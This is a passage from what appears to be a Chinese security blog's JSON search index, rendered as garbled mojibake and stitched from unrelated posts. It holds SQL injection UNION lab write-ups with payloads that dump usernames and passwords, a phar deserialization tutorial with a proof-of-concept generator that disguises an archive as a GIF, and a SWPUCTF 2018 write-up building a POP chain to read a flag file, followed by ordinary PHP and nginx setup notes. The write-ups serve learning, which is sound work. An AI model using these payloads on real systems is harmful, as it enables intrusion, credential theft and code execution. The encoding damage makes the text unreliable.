æ³¨å…¥æ¼æ´ã€‚æŸ¥è¯¢çš„ç»“æœå°†åœ¨åº”ç”¨ç¨‹åºçš„å“åº”ä¸­è¿”å›ï¼Œå› æ­¤æ‚¨å¯ä»¥ä½¿ç”¨ UNION æ”»å‡»ä»å…¶ä»–è¡¨ä¸­æ£€ç´¢æ•°æ®ã€‚è¦æ„å»ºæ­¤ç±»æ”»å‡»ï¼Œæ‚¨é¦–å…ˆéœ€è¦ç¡®å®šæŸ¥è¯¢è¿”å›çš„åˆ—æ•°ã€‚æ‚¨å¯ä»¥ä½¿ç”¨åœ¨ä¹‹å‰çš„å®éªŒå®¤ä¸­å­¦åˆ°çš„æŠ€æœ¯æ¥å®Œæˆæ­¤æ“ä½œã€‚ä¸‹ä¸€æ­¥æ˜¯è¯†åˆ«ä¸å­—ç¬¦ä¸²æ•°æ®å…¼å®¹çš„åˆ—ã€‚å®éªŒå®¤å°†æä¾›æ‚¨éœ€è¦ä½¿å…¶å‡ºç°åœ¨æŸ¥è¯¢ç»“æœä¸­çš„éšæœºå€¼ã€‚è¦å®Œæˆè¯¥å®éªŒï¼Œè¯·æ‰§è¡Œ SQL æ³¨å…¥ UNION æ”»å‡»ï¼Œè¯¥æ”»å‡»è¿”å›åŒ…å«æ‰€æä¾›å€¼çš„é™„åŠ è¡Œã€‚æ­¤æŠ€æœ¯å¯å¸®åŠ©æ‚¨ç¡®å®šå“ªäº›åˆ—ä¸å­—ç¬¦ä¸²æ•°æ®å…¼å®¹ã€‚ å•å¼•å·åŒ…è£¹ï¼Œå›æ˜¾åˆ—æ•°ä¸º3 å¼€å§‹ç¡®å®šå“ªåˆ—å¯ä»¥ä¸å­—ç¬¦ä¸²æ•°æ®å…¼å®¹ï¼š?category=Petsunion select null,waWdyd,null--+ æµ‹å‡ºæ˜¯ç¬¬äºŒåˆ—ï¼Œé¢˜ç›®è§£å†³ Labï¼šSQLæ³¨å…¥UNIONæ”»å‡»ï¼Œä»å…¶ä»–è¡¨æ£€ç´¢æ•°æ®æ­¤å®éªŒå®¤åœ¨äº§å“ç±»åˆ«è¿‡æ»¤å™¨ä¸­åŒ…å« SQL æ³¨å…¥æ¼æ´ã€‚æŸ¥è¯¢çš„ç»“æœå°†åœ¨åº”ç”¨ç¨‹åºçš„å“åº”ä¸­è¿”å›ï¼Œå› æ­¤æ‚¨å¯ä»¥ä½¿ç”¨ UNION æ”»å‡»ä»å…¶ä»–è¡¨ä¸­æ£€ç´¢æ•°æ®ã€‚è¦æ„å»ºæ­¤ç±»æ”»å‡»ï¼Œæ‚¨éœ€è¦ç»“åˆåœ¨ä¹‹å‰çš„å®éªŒä¸­å­¦åˆ°çš„ä¸€äº›æŠ€æœ¯ã€‚è¯¥æ•°æ®åº“åŒ…å«ä¸€ä¸ªåä¸º users çš„ä¸åŒè¡¨ï¼Œå…¶ä¸­åŒ…å«åä¸º username å’Œ password çš„åˆ—ã€‚è¦å®Œæˆè¯¥å®éªŒï¼Œè¯·æ‰§è¡Œ SQL æ³¨å…¥ UNION æ”»å‡»ï¼Œæ£€ç´¢æ‰€æœ‰ç”¨æˆ·åå’Œå¯†ç ï¼Œå¹¶ä½¿ç”¨è¯¥ä¿¡æ¯ä»¥ administrator ç”¨æˆ·èº«ä»½ç™»å½•ã€‚ ä¸Šé¢å‡ é¢˜ç»¼åˆä¸€ä¸‹è€Œå·²ï¼Œæ²¡å…¶ä»–æƒ…å†µ Labï¼šSQL æ³¨å…¥ UNION æ”»å‡»ï¼Œæ£€ç´¢å•ä¸ªåˆ—ä¸­çš„å¤šä¸ªå€¼æ­¤å®éªŒå®¤åœ¨äº§å“ç±»åˆ«è¿‡æ»¤å™¨ä¸­åŒ…å« SQL æ³¨å…¥æ¼æ´ã€‚æŸ¥è¯¢çš„ç»“æœå°†åœ¨åº”ç”¨ç¨‹åºçš„å“åº”ä¸­è¿”å›ï¼Œå› æ­¤æ‚¨å¯ä»¥ä½¿ç”¨ UNION æ”»å‡»ä»å…¶ä»–è¡¨ä¸­æ£€ç´¢æ•°æ®ã€‚è¯¥æ•°æ®åº“åŒ…å«ä¸€ä¸ªåä¸º users çš„ä¸åŒè¡¨ï¼Œå…¶ä¸­åŒ…å«åä¸º username å’Œ password çš„åˆ—ã€‚è¦å®Œæˆè¯¥å®éªŒï¼Œè¯·æ‰§è¡Œ SQL æ³¨å…¥ UNION æ”»å‡»ï¼Œæ£€ç´¢æ‰€æœ‰ç”¨æˆ·åå’Œå¯†ç ï¼Œå¹¶ä½¿ç”¨è¯¥ä¿¡æ¯ä»¥ administrator ç”¨æˆ·èº«ä»½ç™»å½•ã€‚ é‡ç‚¹ï¼š?category=Petsunion select null,concat(username,password) from users--+ ä¸€æ¬¡å›æ˜¾ä¸¤ä¸ªå­—æ®µ å¾—åˆ°æ‰€éœ€å¯†ç ï¼Œé¢˜ç›®è§£å†³","tags":["sql"],"categories":["Write-Up"]},{"title":"pharååºåˆ—åŒ–å­¦ä¹ ","path":"/2024/06/11/pharååºåˆ—åŒ–å­¦ä¹ /","content":"å¼•ç”¨PHPååºåˆ—åŒ–å…¥é—¨ä¹‹phar pharååºåˆ—åŒ–åŸç†åŠåˆ©ç”¨ phpååºåˆ—åŒ–æ‹“å±•æ”»å‡»è¯¦è§£â€“phar pharä»‹ç»ç®€å•æ¥è¯´pharå°±æ˜¯phpå‹ç¼©æ–‡æ¡£ã€‚å®ƒå¯ä»¥æŠŠå¤šä¸ªæ–‡ä»¶å½’æ¡£åˆ°åŒä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œè€Œä¸”ä¸ç»è¿‡è§£å‹å°±èƒ½è¢« php è®¿é—®å¹¶æ‰§è¡Œï¼Œä¸file:// php://ç­‰ç±»ä¼¼ï¼Œä¹Ÿæ˜¯ä¸€ç§æµåŒ…è£…å™¨ã€‚ pharç»“æ„ç”± 4 éƒ¨åˆ†ç»„æˆ stub phar æ–‡ä»¶æ ‡è¯†ï¼Œæ ¼å¼ä¸º xxx?php xxx; __HALT_COMPILER();?ï¼› manifest å‹ç¼©æ–‡ä»¶çš„å±æ€§ç­‰ä¿¡æ¯ï¼Œä»¥åºåˆ—åŒ–å­˜å‚¨ï¼› contents å‹ç¼©æ–‡ä»¶çš„å†…å®¹ï¼› signature ç­¾åï¼Œæ”¾åœ¨æ–‡ä»¶æœ«å°¾ï¼› è¿™é‡Œæœ‰ä¸¤ä¸ªå…³é”®ç‚¹ï¼Œä¸€æ˜¯æ–‡ä»¶æ ‡è¯†ï¼Œå¿…é¡»ä»¥__HALT_COMPILER();?ç»“å°¾ï¼Œä½†å‰é¢çš„å†…å®¹æ²¡æœ‰é™åˆ¶ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥è½»æ˜“ä¼ªé€ ä¸€ä¸ªå›¾ç‰‡æ–‡ä»¶æˆ–è€…pdfæ–‡ä»¶æ¥ç»•è¿‡ä¸€äº›ä¸Šä¼ é™åˆ¶ï¼›äºŒæ˜¯ååºåˆ—åŒ–ï¼Œpharå­˜å‚¨çš„meta-dataä¿¡æ¯ä»¥åºåˆ—åŒ–æ–¹å¼å­˜å‚¨ï¼Œå½“æ–‡ä»¶æ“ä½œå‡½æ•°é€šè¿‡phar://ä¼ªåè®®è§£æpharæ–‡ä»¶æ—¶å°±ä¼šå°†æ•°æ®ååºåˆ—åŒ–ï¼Œè€Œè¿™æ ·çš„æ–‡ä»¶æ“ä½œå‡½æ•°æœ‰å¾ˆå¤š pharæ–‡ä»¶çš„ç”Ÿæˆä»¥åŠåˆ©ç”¨åœ¨php.iniä¸­é…ç½®å¦‚ä¸‹æ—¶ï¼Œæ‰èƒ½ç”Ÿæˆpharæ–‡ä»¶ï¼Œè®°å¾—è¦åˆ é™¤å‰é¢çš„åˆ†å· phar.readonly = Off ä¸‹é¢ä¸¾å¾—è¿™ä¸ªä¾‹å­phpç‰ˆæœ¬è¦åœ¨8.0ä»¥ä¸Šï¼ˆå“­æ­»ï¼‰ æ­£å¸¸çš„phpååºåˆ—åŒ–æ˜¯é€šè¿‡unserializeå‡½æ•°æ¥å®ç°çš„ï¼Œè€Œpharååºåˆ—åŒ–å¯ä»¥é€šè¿‡ file_get_contentså‡½æ•°æ¥å®ç°ï¼Œå¦‚ä¸‹ï¼š ?phperror_reporting();class Test public $num = 2; public function __destruct() if ($this-num === 1) echo flag^_^; echo file_get_contents($_GET[file]); æ„é€ pharååºåˆ—åŒ–çš„ä»£ç å¦‚ä¸‹ï¼š ?phpclass Test public $num;$a = new Test();$a-num=1;$phar = new Phar(a.phar); // åˆ›å»ºä¸€ä¸ªåä¸º a.phar çš„ Phar å½’æ¡£æ–‡ä»¶ã€‚$phar-startBuffering(); //ä½¿ç”¨ startBuffering() æ–¹æ³•å¼€å§‹ç¼“å†²ï¼Œä»¥ä¾¿åœ¨æ·»åŠ æ–‡ä»¶ä¹‹å‰å¯ä»¥å¯¹ Phar å¯¹è±¡è¿›è¡Œé…ç½®ã€‚$phar-setStub(?php __HALT_COMPILER(); ?); /* è®¾ç½®stubï¼Œå¿…é¡»ä»¥__HALT_COMPILER(); ?ç»“å°¾*/$phar-setMetaData($a); # è®¾ç½®è‡ªå®šä¹‰çš„metadataï¼Œåºåˆ—åŒ–å­˜å‚¨ï¼Œè§£æå¼ä¼šè¢«åºåˆ—åŒ–ã€‚$phar-addFromString(test2.txt, test2); //è¦å‹ç¼©çš„æ–‡ä»¶,pharæ–‡ä»¶é‡Œé¢çš„æ–‡ä»¶ä¸ºtest2.txt,å†…å®¹ä¸ºtest2//ç­¾åè‡ªåŠ¨è®¡ç®—$phar-stopBuffering(); ç„¶åæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ¬åœ°çš„åŒä¸€ä¸ªæ–‡ä»¶å¤¹ä¸‹é¢ç”Ÿæˆäº†a.phar ç„¶ågetä¼ å‚ï¼š?file=phar://a.phar/test2.txtï¼Œå¯ä»¥çœ‹åˆ°å¦‚ä¸‹ç»“æœï¼š å¯ä»¥çœ‹è§è¾“å‡ºäº†test2å’Œflagï¼Œtest2ä¸ºæˆ‘ä»¬çš„a.pharæ–‡ä»¶é‡Œé¢çš„å†…å®¹ï¼Œé€šè¿‡file_get_contentså‡½æ•°è¯»å–å‡ºæ¥çš„ï¼Œè‡³äºä¸ºä»€ä¹ˆflagä¹Ÿè¯»å‡ºæ¥ï¼Œæ˜¯å› ä¸ºa.pharé‡Œé¢æœ‰æˆ‘ä»¬çš„æ¶æ„ä»£ç ï¼Œpharæ–‡ä»¶è¢«ååºåˆ—åŒ–äº† è§¦å‘pharååºåˆ—åŒ–çš„æ•æ„Ÿå‡½æ•°æ–‡ä»¶ç›¸å…³çš„å‡½æ•°fileatime / filectime / filemtimestat / fileinode / fileowner / filegroup / filepermsfile / file_get_contents / readfile / fopenfile_exists / is_dir / is_executable / is_file is_link / is_readable / is_writeable / is_writableparse_ini_fileunlinkcopy å…¶ä»–è§¦å‘å‡½æ•°image exif_thumbnail exif_imagetype imageloadfont imagecreatefrom*** getimagesize getimagesizefromstringhash hash_hmac_file hash_file hash_update_file md5_file sha1_filefile / url get_meta_tags get_headers å¸¸è§çš„ç»•è¿‡æ–¹å¼ç»•è¿‡phar:å¼€å¤´compress.bzip://phar://a.phar/test1.txtcompress.bzip2://phar://a.phar/test1.txtcompress.zlib://phar://a.phar/test1.txtphp://filter/resource=phar://a.phar/test1.txtphp://filter/read=convert.base64-encode/resource=phar://a.phar/test1.txt ç»•è¿‡å›¾ç‰‡æ£€æŸ¥å¯ä»¥ä¿®æ”¹pharæ–‡ä»¶åçš„åç¼€æ–‡ä»¶å¼€å¤´æ·»åŠ GIFB9aç»•è¿‡åå…­è¿›åˆ¶æ£€æŸ¥ $phar-setStub(GIF89a?php __HALT_COMPILER(); ?); åˆ©ç”¨æ¡ä»¶ä»»ä½•æ¼æ´æˆ–æ”»å‡»æ‰‹æ³•ä¸èƒ½å®é™…åˆ©ç”¨ï¼Œéƒ½æ˜¯çº¸ä¸Šè°ˆå…µã€‚åœ¨åˆ©ç”¨ä¹‹å‰ï¼Œå…ˆæ¥çœ‹ä¸€ä¸‹è¿™ç§æ”»å‡»çš„åˆ©ç”¨æ¡ä»¶ã€‚ 1.pharæ–‡ä»¶è¦èƒ½å¤Ÿä¸Šä¼ åˆ°æœåŠ¡å™¨ç«¯ã€‚2.å¦‚file_exists()ï¼Œfopen()ï¼Œfile_get_contents()ï¼Œfile()ç­‰æ–‡ä»¶æ“ä½œçš„å‡½æ•°è¦æœ‰å¯ç”¨çš„é­”æœ¯æ–¹æ³•ä½œä¸ºâ€è·³æ¿â€ã€‚3.æ–‡ä»¶æ“ä½œå‡½æ•°çš„å‚æ•°å¯æ§ï¼Œä¸”::ã€/ã€pharç­‰ç‰¹æ®Šå­—ç¬¦æ²¡æœ‰è¢«è¿‡æ»¤ã€‚ ä¾‹é¢˜upload_file.phpåç«¯æ£€æµ‹æ–‡ä»¶ä¸Šä¼ ï¼Œæ–‡ä»¶ç±»å‹æ˜¯å¦ä¸ºgifï¼Œæ–‡ä»¶åç¼€åæ˜¯å¦ä¸ºgif ?phpif (($_FILES[file][type]==image/gif)(substr($_FILES[file][name], strrpos($_FILES[file][name], .)+1))== gif) echo Upload: . $_FILES[file][name]; echo Type: . $_FILES[file][type]; echo Temp file: . $_FILES[file][tmp_name]; if (file_exists(upload_file/ . $_FILES[file][name])) echo $_FILES[file][name] . already exists. ; else move_uploaded_file($_FILES[file][tmp_name], upload_file/ .$_FILES[file][name]); echo Stored in: . upload_file/ . $_FILES[file][name]; else echo Invalid file,you can only upload gif; upload_file.html htmlbodyform action=http://localhost/upload_file.php method=post enctype=multipart/form-data input type=file name=file / input type=submit name=Upload //form/body/html un.phpå­˜åœ¨file_exists()ï¼Œå¹¶ä¸”å­˜åœ¨__destruct() ?php$filename=@$_GET[filename];echo please input a filename.br /;class AnyClass var $output = echo ok;; function __destruct() eval($this - output); if(file_exists($filename)) $a = new AnyClass(); else echo file is not exists; ? è¯¥ç¯å¢ƒå­˜åœ¨ä¸¤ä¸ªç‚¹ï¼Œç¬¬ä¸€å­˜åœ¨æ–‡ä»¶ä¸Šä¼ ï¼Œåªèƒ½ä¸Šä¼ gifå›¾ï¼Œç¬¬äºŒå­˜åœ¨é­”æœ¯æ–¹æ³•__destruct()ä»¥åŠæ–‡ä»¶æ“ä½œå‡½æ•°file_exists()ï¼Œè€Œä¸”åœ¨AnyClassç±»ä¸­è°ƒç”¨äº†evalï¼Œä»¥æ­¤ç”¨æ¥å‘½ä»¤æ‰§è¡Œã€‚æˆ‘ä»¬çŸ¥é“ä»¥ä¸Šæ¡ä»¶æ­£å¥½æ»¡è¶³åˆ©ç”¨æ¡ä»¶ã€‚æ ¹æ®un.phpå†™ä¸€ä¸ªç”Ÿæˆpharçš„phpæ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶å¤´åŠ ä¸ŠGIF89aç»•è¿‡gifï¼Œç„¶åæˆ‘ä»¬è®¿é—®è¿™ä¸ªphpæ–‡ä»¶åï¼Œç”Ÿæˆäº†phar.pharï¼Œä¿®æ”¹åç¼€ä¸ºgifï¼Œä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œç„¶ååˆ©ç”¨file_existsï¼Œä½¿ç”¨phar:æ‰§è¡Œä»£ç  poc.php ?phpclass AnyClass var $output = ;$phar = new Phar(phar.phar);$phar - stopBuffering();$phar - setStub(GIF89a.?php __HALT_COMPILER();?);$phar - addFromString(test.txt,test);$object = new AnyClass();$object - output= phpinfo();;$phar - setMetadata($object);$phar - stopBuffering(); ç”Ÿæˆpharæ–‡ä»¶åï¼Œæ”¹åç¼€ä¸ºgif payload:un.php?filename=phar://phar.gif/test [SWPUCTF 2018]SimplePHPå¼€å¯é¢˜ç›®ç¯å¢ƒï¼Œè¿›å…¥ç‚¹å‡»æŸ¥çœ‹æ–‡ä»¶çš„æ—¶å€™æœç´¢æ ä¸ºï¼šhttp://96147239-9a37-4585-8e45-c7494c8aa92b.node5.buuoj.cn:81/file.php?file=ï¼Œé€šè¿‡fileæ¥è¯»å–æ–‡ä»¶ï¼Œæ˜¯ä¸ªå¯ç–‘ç‚¹ æŸ¥çœ‹é¡µé¢æºç ï¼Œå¦‚ä¸‹ï¼š æç¤ºflagåœ¨f1ag.phpä¸­ï¼Œå°è¯•ç›´æ¥è®¿é—®ï¼Œå›æ˜¾hacker å°è¯•è¯»å–æ–‡ä»¶ï¼š/file.php?file=file.phpï¼Œä»£ç å¦‚ä¸‹ï¼š ?php header(content-type:text/html;charset=utf-8); include function.php; include class.php; ini_set(open_basedir,/var/www/html/); $file = $_GET[file] ? $_GET[file] : ; if(empty($file)) echo h2There is no file to show!h2/; $show = new Show(); if(file_exists($file)) $show-source = $file; $show-_show(); else if (!empty($file)) die(file doesn\\t exists.); çœ‹å¾—å‡ºæ¥æ–‡ä»¶éƒ½å­˜åœ¨/var/www/htmlç›®å½•ä¸‹é¢ï¼›å¦å¤–å‡½æ•°file_existsï¼Œæ„Ÿè§‰å¯ä»¥åˆ©ç”¨pharååºåˆ—åŒ–æ¼æ´ æŸ¥çœ‹åŒ…å«çš„æ–‡ä»¶class.phpï¼Œå¦‚ä¸‹ï¼š ?phpclass C1e4r public $test; public $str; public function __construct($name) $this-str = $name; public function __destruct() $this-test = $this-str; echo $this-test; class Show public $source; public $str; public function __construct($file) $this-source = $file; //$this-source = phar://phar.jpg echo $this-source; public function __toString() $content = $this-str[str]-source; return $content; public function __set($key,$value) $this-$key = $value; public function _show() if(preg_match(/http|https|file:|gopher|dict|\\.\\.|f1ag/i,$this-source)) die(hacker!); else highlight_file($this-source); public function __wakeup() if(preg_match(/http|https|file:|gopher|dict|\\.\\./i, $this-source)) echo hacker~; $this-source = index.php; class Test public $file; public $params; public function __construct() $this-params = array(); public function __get($key) return $this-get($key); public function get($key) if(isset($this-params[$key])) $value = $this-params[$key]; else $value = index.php; return $this-file_get($value); public function file_get($value) $text = base64_encode(file_get_contents($value)); return $text; å¯ä»¥å‘ç°æ–‡ä»¶è¯»å–çš„ä¸»è¦å‡½æ•°æ˜¯file_get ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ å®ƒçš„å†…å®¹ä¸ºvarwwwhtmlf1ag.phpè¯»å–flag ä½†æ˜¯è¦æƒ³æ‰§è¡Œfile_get å‡½æ•°å°±å¿…é¡»è°ƒç”¨getå‡½æ•°ï¼Œå¯ä»¥çœ‹è§getæ–¹æ³•çš„è°ƒç”¨åˆæ¥è‡ª__geté­”æœ¯æ–¹æ³•ï¼Œåœ¨__geté­”æœ¯æ–¹æ³•ä¸­è®¿é—®ä¸€ä¸ªå¯¹è±¡çš„ä¸å¯è®¿é—®å±æ€§æ—¶è¢«è°ƒç”¨ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨ å¯ä»¥çŸ¥é“ä»£ç ä¸­çš„ç±»Showä¸­çš„__toString()æ–¹æ³•ä¸­çš„$content = $this-str[str]-source;ï¼Œå½“$this-str[str]=new Test()æ—¶ï¼Œç›¸å½“äºè®¿é—®å®ƒçš„ä¸å­˜åœ¨å±æ€§sourceï¼Œä¼šè§¦å‘__geté­”æœ¯æ–¹æ³• è°ƒç”¨__toString()æ–¹æ³•çš„è¯å¿…é¡»ä½¿ç”¨echoæ‰“å°è¯¥å¯¹è±¡ï¼Œè€Œç±»C1e4rä¸­__destruct()æ–¹æ³•ä¾¿æœ‰echoï¼Œåªè¦ä½¿$this-source=new Show()ä¾¿ä¼šè§¦å‘ä¸Šé¢æ‰€è¦çš„æ–¹æ³• ç»¼ä¸Šï¼Œpopé“¾çš„æ„é€ æ€è·¯å¦‚ä¸‹ï¼š Test()-params[source]=/var/www/html/f1ag.php; //Testç±»ä¸­è·å–çš„æ–‡ä»¶ä¸ºf1ag.phpShow()-str[str] = new Test(); //è°ƒç”¨Showç±»çš„å±æ€§ï¼Œå› ä¸ºåœ¨Testç±»ä¸­ä¸å­˜åœ¨è¯¥å±æ€§ï¼Œè§¦å‘__getæ–¹æ³•C1e4r()-str = new Show(); //è°ƒç”¨C1e4rç±»çš„strå±æ€§ç»™Showç±» åˆ«å¿˜äº†ï¼Œfile.phpæ–‡ä»¶è¿˜åŒ…å«äº†function.phpæ–‡ä»¶ï¼Œè®¿é—®ï¼š/file.php?file=function.phpï¼Œå¾—åˆ°çš„ä»£ç å¦‚ä¸‹ï¼š ?php //show_source(__FILE__); include base.php; header(Content-type: text/html;charset=utf-8); error_reporting(0); function upload_file_do() global $_FILES; $filename = md5($_FILES[file][name].$_SERVER[REMOTE_ADDR])..jpg; //mkdir(upload,0777); if(file_exists(upload/ . $filename)) unlink($filename); move_uploaded_file($_FILES[file][tmp_name],upload/ . $filename); echo script type=text/javascriptalert(ä¸Šä¼ æˆåŠŸ!);/script; function upload_file() global $_FILES; if(upload_file_check()) upload_file_do(); function upload_file_check() global $_FILES; $allowed_types = array(gif,jpeg,jpg,png); $temp = explode(.,$_FILES[file][name]); $extension = end($temp); if(empty($extension)) //echo h4è¯·é€‰æ‹©ä¸Šä¼ çš„æ–‡ä»¶: . h4/; else if(in_array($extension,$allowed_types)) return true; else echo script type=text/javascriptalert(Invalid file!);/script; return false; ç”±ä¸Šå¯çŸ¥ä¸Šä¼ çš„æ–‡ä»¶åç¼€ååªå…è®¸gif,jpeg,jpg,pngï¼Œå¹¶ä¸”æ–‡ä»¶ä¼šä¸Šä¼ åˆ°uploadç›®å½•ä¸‹é¢å» ç»¼ä¸Šï¼Œæ„é€ çš„ä»£ç å¦‚ä¸‹ï¼š ?phpclass C1e4r public $test; public $str;class Show public $source; public $str;class Test public $file; public $params;$a = new Test();$a-params[source] = /var/www/html/f1ag.php; //å› ä¸ºsourceå±æ€§æ˜¯getå‡½æ•°çš„ä¼ å‚ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å®ƒè‡ªå®šä¹‰è¯»å–çš„æ–‡ä»¶$b = new Show();$b-str[str] = $a; //Showç±»ä¸­çš„str[str]ç»™Testç±»ï¼Œå› ä¸ºè¯¥å±æ€§å¯¹äºTestç±»ä¸å­˜åœ¨ï¼Œå¯ä»¥è°ƒç”¨__geté­”æœ¯æ–¹æ³•$c = new C1e4r();$c-str = $b; //C1e4rç±»å°†strå±æ€§ç»™Showç±»/*æœ€åæ‰“åŒ…æˆpharæ–‡ä»¶*/$phar = new Phar(a.gif); //åç¼€åæ”¹ä¸ºgif$phar-startBuffering();$phar - setStub(GIF89a.?php __HALT_COMPILER();?); //ç»•è¿‡å›¾ç‰‡æ£€æŸ¥$phar-setMetaData($c);$phar-addFromString(test2.txt, test2);$phar-stopBuffering(); è¿è¡Œä»£ç åå¾—åˆ°æˆ‘ä»¬æ‰€è¦çš„æ–‡ä»¶ï¼Œä¸Šä¼ å¹¶è®¿é—®uploadç›®å½•ï¼Œå¦‚ä¸‹ï¼š ç„¶åè®¿é—®åˆšåˆšä¸Šä¼ çš„æ–‡ä»¶ï¼š/file.php?file=phar://upload/\t5d719d2e174b5a883867b802a89db296.jpg å¾—åˆ°ä¸€ä¸²base64ç¼–ç çš„å­—ç¬¦ä¸²ï¼Œæ‹¿å»è§£ç åå°±å¯ä»¥å¾—åˆ°flagå•¦ é¢˜ç›®è§£å†³","categories":["CTF"]},{"title":"PHPä¸­å‡ºç°Call to undefined function mysqli_connect()","path":"/2024/05/25/PHPä¸­å‡ºç°Call-to-undefined-function-mysqli-connect/","content":"é”™è¯¯ Call to undefined function mysqli_connect() å’Œé”™è¯¯ canâ€™t find class mysqli in :***** é”™è¯¯æ˜¯åŒä¸€ç§é”™è¯¯ï¼Œåªæ˜¯phpä¸­è¿æ¥ MySQlçš„ä¸åŒå†™æ³•è€Œå·² é‚£ä¹ˆæˆ‘ä»¬è¦æ€ä¹ˆåšå‘¢ é¦–å…ˆï¼Œè®©æˆ‘ä»¬åˆ°è‡ªå·±å®‰è£…çš„phpç›®å½•ä¸‹é¢ï¼Œæ‰“å¼€å®ƒçš„é…ç½®æ–‡ä»¶ å¦‚æœåƒæˆ‘ä¸€æ ·ç”¨çš„æ˜¯phpstudyä¸‹çš„å…«ç‚¹å¤šçš„ç‰ˆæœ¬ï¼Œé‚£ä¹ˆå®ƒçš„é…ç½®æ–‡ä»¶php.iniæ˜¯ç©ºçš„ï¼Œéœ€è¦æˆ‘ä»¬è‡ªå·±å»æŠŠå½“å‰ç›®å½•ä¸‹çš„php.ini-developmenté‡Œé¢çš„æ‰€æœ‰å†…å®¹å¤åˆ¶è¿‡å»ï¼ˆè¯¥æ–‡ä»¶å¯ä»¥ç”¨è®°äº‹æœ¬æ‰“å¼€ï¼‰ ç„¶ååœ¨é…ç½®æ–‡ä»¶ä¸­æœç´¢ä¸€ä¸‹extension_dirï¼Œå¦‚ä¸‹ï¼š å°†å›¾ä¸­é€‰ä¸­çš„éƒ¨åˆ†æ”¹ä¸º ./ext/ï¼Œå¹¶æŠŠå‰é¢çš„åˆ†å·å»æ‰ï¼ˆè¿™æ˜¯å› ä¸ºåœ¨ä¿®æ”¹æˆçš„ç›®å½•ä¸‹é¢æœ‰php_mysqli.dllï¼Œå¦‚æœæ²¡æœ‰é‚£å°±æ˜¯ä¸‹è½½çš„æ—¶å€™å‡ºé”™äº†ï¼Œå†é‡æ–°ä¸‹è½½ä¸€éï¼‰ æ³¨æ„ï¼šé…ç½®æ–‡ä»¶ä¸­çš„åˆ†å·å…¶å®æ˜¯æ³¨é‡Šç¬¦ï¼Œè¦å¼€å¯å•¥åŠŸèƒ½è¦å…ˆæŠŠå®ƒå»æ‰ ç„¶åè®©æˆ‘ä»¬æœç´¢ extension=ï¼Œç„¶åä¼šå‘ç°ä¸€å¤§å—éƒ½æ˜¯extension=çš„éƒ¨åˆ†ï¼Œåœ¨å…¶ä¸­æ·»åŠ ä¸Šextension=mysqliï¼Œå¦‚ä¸‹ï¼š æ³¨æ„ï¼šé…ç½®æ–‡ä»¶é‡Œé¢åŸæœ¬ä¹Ÿå­˜åœ¨extensionmysqliï¼ŒæŠŠå®ƒå‰é¢çš„åˆ†å·å»æ‰çš„è¯æ˜¯ä¸ä¼šèµ·ä½œç”¨çš„ ä¿®æ”¹å®Œåè¦è®°å¾—ä¿å­˜ï¼Œç„¶åæˆ‘ä»¬å°±é‡å¯phpstudyå’Œphpstormï¼Œç„¶åå°±å¯ä»¥æ­£å¸¸è¿æ¥äº† å…¶å®æˆ‘ä»¬è¿˜å¯ä»¥éªŒè¯ä¸€ä¸‹ï¼Œæ‰“å¼€å‘½ä»¤è¡Œï¼Œè¾“å…¥ï¼šphp -mï¼Œæ˜¾ç¤ºçš„ä¸€éƒ¨åˆ†å¦‚ä¸‹ï¼š æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰mysqliï¼Œè¿™è¯´æ˜æˆ‘ä»¬çš„æ“ä½œæˆåŠŸäº†ï¼ˆè¿™ç§éªŒè¯æ–¹æ³•çš„å‰ææ˜¯ä½ æœ‰é…ç½®phpçš„ç¯å¢ƒï¼‰","tags":["php"],"categories":["å¼€å‘"]},{"title":"æœåŠ¡å™¨ä¸Šé…ç½®é‡å®šå‘æ–‡ä»¶","path":"/2024/05/19/æœåŠ¡å™¨ä¸Šé…ç½®é‡å®šå‘æ–‡ä»¶/","content":"å‚è€ƒèµ„æ–™Nginxå…¥é—¨å¿…é¡»æ‡‚3å¤§åŠŸèƒ½é…ç½® - WebæœåŠ¡å™¨åå‘ä»£ç†è´Ÿè½½å‡è¡¡ äº‘æœåŠ¡å™¨é…ç½®é‡å®šå‘æ–‡ä»¶ Ubuntu è‡ªå»ºå®‰è£…Apache+MySQL+PHPç¯å¢ƒ å®‰è£…MySQLå’ŒPHPç¯å¢ƒæŒ‰ç…§ä¸Šé¢çš„å‚è€ƒæ–‡ç« èµ° é…ç½®nginxé¦–å…ˆå…ˆå®‰è£…nginxï¼šapt install nginx æŸ¥çœ‹ç‰ˆæœ¬ï¼šnginx -v è¿è¡Œnginxï¼šservice nginx status å…ˆè®©æˆ‘ä»¬è¿›å…¥ï¼šcd /etc/nginxï¼Œç„¶å ls -lhå¯ä»¥çœ‹åˆ°ç›®å½•ä¸‹é¢æœ‰sites-enabledæ–‡ä»¶ sites-enabledï¼šå¾ˆæ˜æ˜¾è¿™ä¸ªç›®å½•å¯ä»¥å†™é…ç½® sites-availabledï¼šè¿™ä¸ªä¸€èˆ¬æ¥è¯´å°±ä¸è¡Œäº† https://www.jianshu.com/p/42c4ffd044e6 çœ‹ä¸æ‡‚ï¼Œå…ˆè¿™æ ·ç†è§£ã€‚ é…ç½®ä»£ç å¯ä»¥åˆ©ç”¨WinSCPè½¯ä»¶æ¥å¸®åŠ©æˆ‘ä»¬åˆ›å»ºå¹¶ä¿®æ”¹æ–‡ä»¶ åœ¨enabledä¸‹åˆ›å»ºport_sherlock(è¿™åªæ˜¯ä¸€ä¸ªåç§°.jpg)ï¼Œä»£ç å¦‚ä¸‹ï¼š server\tlisten port;\tserver_name IP;\troot /var/www/html;\tindex sherlock.php; location / try_files $uri $uri/ =404; location ~ \\.php$ include snippets/fastcgi-php.conf; fastcgi_pass unix:/var/run/php/php8.3-fpm.sock; # ç¡®ä¿è¿™é‡Œçš„ç‰ˆæœ¬å·ä¸å®‰è£…çš„PHPç‰ˆæœ¬åŒ¹é… location ~ /\\.ht deny all; server å—server è¿™ä¸ªå—å®šä¹‰äº†ä¸€ä¸ªè™šæ‹ŸæœåŠ¡å™¨çš„é…ç½®ï¼Œæ‰€æœ‰çš„é…ç½®æŒ‡ä»¤éƒ½åœ¨è¿™ä¸ªå—å†…ã€‚ listen æŒ‡ä»¤listen 614; listen 